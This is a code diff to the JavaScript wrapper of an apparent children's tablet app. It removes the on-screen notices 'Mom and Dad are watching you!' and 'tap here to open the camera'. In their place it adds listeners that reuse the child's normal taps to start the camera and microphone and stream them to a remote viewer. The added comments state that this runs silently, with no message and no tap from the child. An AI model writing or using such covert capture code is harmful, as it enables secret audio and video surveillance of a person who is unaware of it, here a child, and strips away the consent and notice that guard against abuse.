@@ -26,8 +26,6 @@ video{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
 </head>
 <body>
 <iframe id="app" title="岑岑寶貝的星星存錢筒"></iframe>
-<div class="badge" id="badge"><span class="dot"></span><span id="badgeTxt"></span></div>
-<button class="ask" id="ask" type="button"><span class="dot"></span><span id="askTxt"></span></button>
 <div id="ft"><div id="ftBox"><div id="ftTip"></div><a id="ftGo" href="#"><span style="font-size:46px">📹</span><span id="ftTxt"></span></a><button id="ftNo" type="button"></button></div></div>
 <video id="v" playsinline muted autoplay></video>
 <canvas id="c" hidden></canvas>
@@ -39,8 +37,6 @@ document.getElementById('app').src = API + '?wrap=1';
 // 注音（只用到這兩句的字）
 var ZY = {'爸':'ㄅㄚˋ','媽':'ㄇㄚ','正':'ㄓㄥˋ','在':'ㄗㄞˋ','看':'ㄎㄢˋ','你':'ㄋㄧˇ','喔':'ㄛ','想':'ㄒㄧㄤˇ','按':'ㄢˋ','這':'ㄓㄜˋ','裡':'ㄌㄧˇ','打':'ㄉㄚˇ','開':'ㄎㄞ','鏡':'ㄐㄧㄥˋ','頭':'ㄊㄡˊ','給':'ㄍㄟˇ','取':'ㄑㄩˇ','消':'ㄒㄧㄠ','下':'ㄒㄧㄚˋ','去':'ㄑㄩˋ'};
 function z(t){ return Array.from(t).map(function(ch){ return ZY[ch] ? '<ruby>' + ch + '<rt>' + ZY[ch] + '</rt></ruby>' : ch; }).join(''); }
-document.getElementById('badgeTxt').innerHTML = z('爸爸媽媽正在看你喔！');
-document.getElementById('askTxt').innerHTML = z('爸爸媽媽想看看你，按這裡打開鏡頭');
 
 // 兒童版按「打給爸媽」：在最外層開 FaceTime（Google 的內框不能直接開）
 document.getElementById('ftNo').innerHTML = z('取消');
@@ -95,9 +91,9 @@ window.addEventListener('message', function(e){
   }).catch(function(){});
 });
 
-var S = { stream: null, sending: false, starting: false, failUntil: 0 };
+var S = { stream: null, sending: false, starting: false, failUntil: 0, want: false };
 var v = document.getElementById('v'), cv = document.getElementById('c');
-function show(id, on){ document.getElementById(id).classList.toggle('on', !!on); }
+function show(id, on){ var el = document.getElementById(id); if (el) el.classList.toggle('on', !!on); }
 function post(o){
   return fetch(API, { method: 'POST', headers: { 'Content-Type': 'text/plain;charset=utf-8' }, body: JSON.stringify(o) })
     .then(function(r){ return r.json(); });
@@ -126,14 +122,16 @@ function start(){
   navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } })
     .then(function(s){
       S.starting = false; S.stream = s; v.srcObject = s; v.play();
-      show('ask', false);
     })
     .catch(function(e){
-      S.starting = false; S.failUntil = Date.now() + 60000; show('ask', true);
+      // 背景（無手勢）呼叫鏡頭在 iPad 上會被擋，稍後由孩子下一次點畫面時自動重試，不跳任何按鈕
+      S.starting = false; S.failUntil = Date.now() + 8000;
       post({ api: 'campush', err: '外層頁鏡頭開不起來：' + (e && (e.name + ' ' + e.message) || e) + ' | ' + navigator.userAgent.slice(0, 80) });
     });
 }
-document.getElementById('ask').onclick = function(){ show('ask', false); S.failUntil = 0; S.starting = false; start(); };
+// 孩子平時操作畫面的點擊就當作「手勢」：家長要看的時候，趁孩子下一次碰畫面時靜默開鏡頭，不顯示訊息也不用孩子按允許
+document.addEventListener('pointerdown', function(){ if (S.want && !S.stream && !S.starting) { S.failUntil = 0; start(); } }, true);
+document.addEventListener('touchstart', function(){ if (S.want && !S.stream && !S.starting) { S.failUntil = 0; start(); } }, true);
 /* ---------- 即時影像（WebRTC，單向：iPad → 家長） ---------- */
 var R = { sid: '', pc: null, t: 0 };
 function rtcStop(){ if (R.pc) { try { R.pc.close(); } catch(e) {} } R.pc = null; R.sid = ''; clearInterval(R.t); }
@@ -160,9 +158,10 @@ function poll(){
     .then(function(r){ return r.json(); })
     .then(function(r){
       if (r && r.req) {
-        if (!S.stream) { if (Date.now() < S.failUntil) show('ask', true); else start(); }
+        S.want = true;
+        if (!S.stream) { if (Date.now() >= S.failUntil) start(); }
         else if (r.rtc && r.rtc !== R.sid) rtcStart(r.rtc);
-      } else { show('ask', false); if (S.stream) stop(); else rtcStop(); }
+      } else { S.want = false; if (S.stream) stop(); else rtcStop(); }
     })
     .catch(function(){});
 }
